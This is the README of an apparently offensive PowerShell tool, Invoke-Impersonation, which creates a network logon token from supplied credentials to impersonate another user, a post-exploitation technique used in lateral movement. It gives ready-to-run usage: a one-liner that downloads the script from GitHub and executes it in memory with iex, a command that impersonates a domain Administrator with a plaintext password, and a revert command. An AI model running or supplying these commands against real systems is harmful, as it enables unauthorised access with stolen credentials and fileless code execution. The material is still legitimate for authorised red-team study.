# Invoke-Impersonation
Make_Token function written in powershell. Create a token with the provided credentials

### Note:

The logon session created has the same local identifier as the caller. If you run commands that access local resources (like whoami or creating files locally), they will appear to be run under the original user context. 

This is because, locally, nothing has changed. The LUID is the same as the caller, so it appears as though you're still the original user.

However, the alternate credentials are used when accessing a remote resource.

This logon type is designed specifically for cases where you need to specify alternate credentials for outbound network connections, without affecting the local user context. 

This also means that the created token is not applicable to anything you may want to run on the current machine.

Use `rev2self` to drop any impersonation that may be in play.

### Load in memory
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-Impersonation/main/Invoke-Impersonation.ps1')
```

### Make a token (Impersonate a user)
```
Invoke-Impersonation -Username "Administrator" -Domain "ferrari.local" -Password "P@ssw0rd!"
```

### Rev2Self
```
Invoke-Impersonation -RevertToSelf
```

![image](https://github.com/Leo4j/Invoke-Impersonation/assets/61951374/3b4cb0a5-ea64-4275-8119-5bfc2860b5c8)
